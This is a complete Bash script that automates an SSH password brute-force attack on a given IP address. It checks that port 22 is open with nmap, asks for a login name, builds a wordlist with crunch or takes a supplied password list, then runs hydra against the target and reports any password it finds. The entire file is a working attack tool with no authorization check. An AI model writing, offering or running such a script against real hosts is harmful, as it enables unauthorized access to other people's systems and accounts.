#!/bin/bash

# Get ip from user
IP=$1

if [ -z "$IP" ]
then
	echo "Please enter an IP address as an argument"
	exit
fi

# Check if SSH is open
nmap $IP -p 22 -oG nmap_info.scan

if [ -z "$(cat nmap_info.scan | grep 22 | grep open)" ]
then
	echo "[!] Port is closed on $IP, please try again with a new IP"
	exit
fi

# Check if user wants to run a Brute force attack
read -p "[*] SSH is found on $IP; would you like to start a BF attack? [Y/n] " input
input=$(echo ${input:-y} | tr '[:upper:]' '[:lower:]')

# Requires user to input y/yes/n/no else, keep requesting user for proper input
until [ "$input" == "y" ] || [ "$input" == "yes" ] || [ "$input" == "n" ]  || [ "$input" == "no" ]
do
	read -p "[!] You have inputted $input. Please enter either y or n " input
	input=$(echo ${input:-y} | tr '[:upper:]' '[:lower:]')
done

if [ "$input" == "n" ]  || [ "$input" == "no" ]
then
	echo "Thank you for using my program!"
	exit
fi

# Ask for login name 
read -p "[*] BF attack: Please enter a login name to access " login

# Let user choose to use crunch or password list
read -p "[?] BF attack: Crunch or password list? [c/p/quit] " input
input=$(echo $input | tr '[:upper:]' '[:lower:]')

until [ "$input" == "c" ] || [ "$input" == "p" ] || [ "$input" == "quit" ]
do
	read -p "[!] You have inputted $input. Please enter c or p or quit " input
done

case $input in 
	c)
		read -p "[*] Enter min char: " min
		read -p "[*] Enter max char: " max
		read -p "[*] Enter chars: " chars
		crunch $min $max $chars > pass.lst
	;;
	
	p)
		read -p "[*] Please specity a list to use: " list
		cat $list > pass.lst
	;;
	
	quit)
		echo "Thank you for using my program!"
		exit
	;;
esac

# Execute hydra attack and save result
hydra -l $login -P pass.lst $IP ssh -vV > hydra_res.txt

# Check if hydra attack was successful and password found
hydra_output=$(cat hydra_res.txt | grep password: | awk '{print $NF}')
if [ -z "$hydra_output" ]
then
	echo "A password was not found"
	echo "Thank you for using my program!"
else
	echo "A password has been found! It is: $hydra_output"
	echo "Thank you for using my program!"
fi


